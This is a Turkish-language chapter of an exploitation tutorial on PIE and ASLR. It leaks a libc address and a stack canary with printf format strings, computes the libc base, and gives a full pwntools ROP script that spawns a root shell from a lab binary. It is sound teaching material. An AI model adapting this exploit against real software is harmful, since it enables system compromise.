# Hedefimiz
Önceki bölüm ile aynı hedefe sahibiz, programın akışını değiştirerek
bir shell çalıştırmak.

# Kod analizi
Kodumuz önceki bölüm ile birebir aynı - bu sefer farklı olan şey kodun
çalıştığı ortam.

### Turta!!
Farketmiş olabileceğiniz gibi `-no-pie` opsiyonu bu sefer derleme opsyionlarında
yok. Yani bu binary PIE ile derleniyor. Ve hayır PIE gerçekten turta değil, Position
Independent Executables ya da PCI yani Position Independent Code, basitçe derleyicinin
bellekte herhangi bir adrese yüklenince çalışabilecek kod oluşturmasını sağlıyor.

PIE olmadan derlenen programlar, spesifik adreslere erişen kodlar kullanan binaryler
oluşturulabilir. Bu spesifik adreslerin doğru şekilde erişilebilmesi adına, programın
her seferinde bellekte aynı pozisyona yüklenmesi lazım. Ancak shared libary'ler gibi
bazı programlar, bellekte her zaman aynı alana yüklenmeyebiliyor. Bu sebeple PIE,
pozisyonda bağımsız binaryler oluşturarak bu sorunu ortadan kaldırıyor.

PIE aslında kendi başına bir bellek koruması değil, sadece asıl bellek koruması
olan ASLR için ihtiyacımız olan birşey, hadi şimdi ASLR'ı inceleyelim.

### AS(S)LR
ASLR yani Address Space Layout Randomization şuana kadar karşımıza çıkan bellek
korumalarından bir tanesi, ancak diğerlerinden farklı olarak bu koruma aslında
programın kenidisi tarafından ya da GNU libraryleri ya da derleyicisi tarafından
implemente edilmiyor. Hayır, hayır, doğrudan kernel tarafından implemente edilen
bir bellek koruması.

İsmi aslında bu korumayı olukça basitçe açıklıyor. Bildiğiniz gibi programlar kernel
tarafından kendilerine atanılan bir sanal belleği kullanıyor. Hiçbir programın doğrudan
fiziksel belleğe erişimi yok. Bunun sonucu olarak da bir program belleğe yüklendiğinde semboller,
fonksiyonlar yani kod, aynı pozisyonlara yani adreslere yerleşiyor.

ASLR basitçe program belleğe yüklendiğinde, sanal bellek üzerinde yüklemin
yapıldığı pozisyonu değiştirerek tüm sembol, fonksiyon ve kodun her program yeniden başlayınca
farklı bir pozisyona gelmesini sağlıyor.

Bu bir sorun gibi görünmeyebilir, ancak hatırlarsanız önceki exploitimizde önceden kullandığımız
libc adresi, gadget adresimiz, bunların hepsi artık kullanılamaz durumda - program her yeniden
başlayınca bu adresler farklı bir yere yüklenecek, ve de bizim adreslerimiz tamami ile alakasız
yerlere işaret edecek.

Yani önceden bulup hesapladığımız adresleri kullanmamız mümkün değil. Bu bellek korumasını
nasıl bypass edebileceğimizi anlamak için hadi ASLR'ın nasıl implemente edildiğine bakalım (`mm/util.c`):
```c
/**
 * randomize_page - Generate a random, page aligned address
 * @start:	The smallest acceptable address the caller will take.
 * @range:	The size of the area, starting at @start, within which the
 *		random address must fall.
 *
 * If @start + @range would overflow, @range is capped.
 *
 * NOTE: Historical use of randomize_range, which this replaces, presumed that
 * @start was already page aligned.  We now align it regardless.
 *
 * Return: A page aligned address within [start, start + range).  On error,
 * @start is returned.
 */
unsigned long randomize_page(unsigned long start, unsigned long range)
{
	if (!PAGE_ALIGNED(start)) {
		range -= PAGE_ALIGN(start) - start;
		start = PAGE_ALIGN(start);
	}

	if (start > ULONG_MAX - range)
		range = ULONG_MAX - start;

	range >>= PAGE_SHIFT;

	if (range == 0)
		return start;

	return start + (get_random_long() % range << PAGE_SHIFT);
}
```
Ne? Siz ne bekliyordunuz ELF binarysindeki tüm sembollerin ayrı ayrı parse edilip farklı adreslere yüklenmesini
mi? Öyle şey mi olur? Programın yüklendiği adresi sağ sola kaydırıyoruz işte.

Sanırım burdaki sorunu görebiliyorsunuz. Eğer program çalışırken bilindik bir sembolün adresini alabilirsek, bunu
orjinal adresten çıkartarak bir *offset* hesaplayabiliriz. Bu offset basitçe kernel'in hangi yöne ne kadar sağ sola
kaydırma yaptırmanı gösterir. Ardından bu offseti orjinal adreslere ekleyerek dinamik olarak sembol ve kodun yerini
hesaplayabiliriz.

Şimdi bunu pratikte görelim. **Fakat öncesinde ASLR'ı açmamız lazım**, bu kernel tarafından implemente edildiğinden
programa eklenebilecek bir derleme opsiyonu yok. Doğrudan `/sys` interface'i üzerinden ASLR'ı açıp kapıyoruz.
**Pratik ortamında kullanılan VM'de ASLR boot başında otomatik kapatılıyor.** Bu bölüm için aslr'ı açmak adına
`toggle-aslr` scriptini çalıştırabilirsiniz. Daha sonrasında ASLR'ı tekrar kapatmak adına scripti tekrar çalıştırabilirsiniz.

# Exploit
İlk yapmamız gereken ASLR'ı kırmak için offseti hesaplamak. Bunun içinde güvenilir olarak bize bilindik bir sembol
adresi leakleyebileceğimiz bir yol lazım.

Bunun için stack çerezlerini leaklemek için kullandığımız yönetmi kullanabiliriz, sonuçta stack'ten veri okuyoruz,
stack üzerindeki dönüş adresi büyük ihtimalle libc üstünde olacaktır (`printf` sonuçta başka fonksiyonları çağırıyor):
```
root@o101:~/0x4# gdb ./0x4.elf
(gdb) break main
Breakpoint 1 at 0x55555555517d
(gdb) run
...
Breakpoint 1, 0x000055555555517d in main ()
(gdb) info proc map
process 478
Mapped address spaces:

          Start Addr           End Addr       Size     Offset  Perms  objfile
      ...
      0x7ffff7dde000     0x7ffff7e04000    0x26000        0x0  r--p   /usr/lib/x86_64-linux-gnu/libc.so.6
      0x7ffff7e04000     0x7ffff7f59000   0x155000    0x26000  r-xp   /usr/lib/x86_64-linux-gnu/libc.so.6
      0x7ffff7f59000     0x7ffff7fac000    0x53000   0x17b000  r--p   /usr/lib/x86_64-linux-gnu/libc.so.6
      0x7ffff7fac000     0x7ffff7fb0000     0x4000   0x1ce000  r--p   /usr/lib/x86_64-linux-gnu/libc.so.6
      0x7ffff7fb0000     0x7ffff7fb2000     0x2000   0x1d2000  rw-p   /usr/lib/x86_64-linux-gnu/libc.so.6
      ...
(gdb) c
...
Hello, what's your name?
%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
0xa,(nil),(nil),0x55555555601e,0x7ffff7fb0a80,(nil),(nil),0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x70252c70252c,0x705fa3a045226500? [yes/no]
...
```
Gördüğünüz bu örnekte gibi `libc`, `0x7ffff7fb2000` adresinde bitiyor ve de leaklediğimiz 5. adres bu adres aralığında (`0x7ffff7fb0a80`),
bu adresin `libc` üzerindeki asıl konumunu, `libc`nin başlangıç adresinden (`0x7ffff7dde000`) çıkartarak öğrenebiliriz
(ASLR gdb altında çalışmıyor, bunlar orjinal adresler):
```
root@o101:~# python3
Python 3.11.8 (main, Feb 12 2024, 14:50:05) [GCC 13.2.1 20230801] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(0x7ffff7fb0a80-0x7ffff7dde000)
'0x1d2a80'
```
Sanırım ne yapacağımızı anladınız, program çalışırken ASLR yüzünden kaydırılmış olan stack üzerindeki adresi leakleyeğiz, sonra
bu adresten `0x1d2a80` çıkartak ASLR tarafından kaydırılmış olan `libc` adresini bulacağız, bu ana başlangıç adresine *base adresi*
de denir.

Bu arada bir sürü `%p` yerine daha akılıca bir şey kullanabiliriz:
```
%5$p,%13$p
```
`[n]$` syntaxi basitçe okuncak argümanın `printf`e verilen kaçıncı argüman olduğunu belirtiyor.

Bu şekilde leaklediğimiz adresi ve de çerezi pwntools ile yazdığımız exploitimizde çekebiliriz:
```python
from pwn import *

context.update(arch="amd64", os="linux")
elf = context.binary = ELF("./0x4.elf")
libc = elf.libc
p = process("./0x4.elf")

p.recvuntil(b"\n")
p.sendline(b"%5$p,%13$p,")
line   = p.recvline().split(b",")
leak   = line[0]
cookie = line[1]
info(f"Leaked libc address: {leak.decode()}")
info(f"Leaked cookie: {cookie.decode()}")

libc.address = int(leak, 16) - 0x1d2a80
info(f"Found libc base: {hex(libc.address)}")
```
Burada işimizi kolaylaştırmak adına binary'nin yüklendiği `libc` librarysini binary'nin
`ELF()` objesinden çekiyoruz, sonrasında çerezi ve leakediğimiz adresi parse ettikten sonra `libc`nin
adresini bulduğumuz offset ile hesaplıyoruz. Artık `libc`nin adresini biliyoruz, ancak bunu doğru kullanmamız
lazım. Hatırlarsanız önceki bölümde bulduğumuz gadgetların adreslerini `libc`nin orjinal adresine eklemiştik.
Bu sefer bu yeni adrese ekleme yapacağız ve dinamik olarak gadgetların lokasyonunu bulacağız:
```python
payload  = b"A"*56                             # answer + name
payload += p64(int(cookie, 16))                # cookie
payload += b"A"*8                              # rbp
payload += p64(libc.address+0x277e5)           # pop rdi; ret
```
Sıra `/bin/sh` stringinde, bunu hesaplamak yerine aslında pwntools'un bize sunduğu sembol arama özelliğini
kullanabiliriz:
```python
payload += p64(next(libc.search(b"/bin/sh")))  # /bin/sh
```
sonrasında `ret` gadegetımız ve de `system()` çağrımız var, `system()` çağrısı için de `libc` objesinin doğrudan
sembollerine pwntools aracılığı ile erişebiliriz:
```python
payload += p64(libc.address+0x26e99)           # ret
payload += p64(libc.sym["system"])             # system()
```
Son olarak exploiti, payload'ımızı `stdin`e göndererek tamamlayalım:
```python
from pwn import *

context.update(arch="amd64", os="linux")
elf = context.binary = ELF("./0x4.elf")
libc = elf.libc
p = process("./0x4.elf")

p.recvuntil(b"\n")
p.sendline(b"%5$p,%13$p,")
line   = p.recvline().split(b",")
leak   = line[0]
cookie = line[1]
info(f"Leaked libc address: {leak.decode()}")
info(f"Leaked cookie: {cookie.decode()}")

libc.address = int(leak, 16) - 0x1d2a80
info(f"Found libc base: {hex(libc.address)}")

payload  = b"A"*56                            # answer + name
payload += p64(int(cookie, 16))               # cookie
payload += b"A"*8                             # rbp
payload += p64(libc.address+0x277e5)          # pop rdi; ret
payload += p64(next(libc.search(b"/bin/sh"))) # /bin/sh
payload += p64(libc.address+0x26e99)          # ret
payload += p64(libc.sym["system"])            # system()

p.sendline(payload)
p.interactive()
```
Herşey hazır olduğuna göre exploitimizi test edebiliriz:
```
root@o101:~/0x4# toggle-aslr
ASLR is now ON!
root@o101:~/0x4# python3 solve.py
[*] '/root/0x4/0x4'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/usr/lib/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './0x4.elf': pid 647
[*] Leaked libc address: 0x7ff2f78de8e0
[*] Leaked cookie: 0xb2eb9110c6dc3500
[*] Found libc base: 0x7ff2f7706000
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
```

---
[Önceki](0x3.md) | [Sonraki](0x5.md)
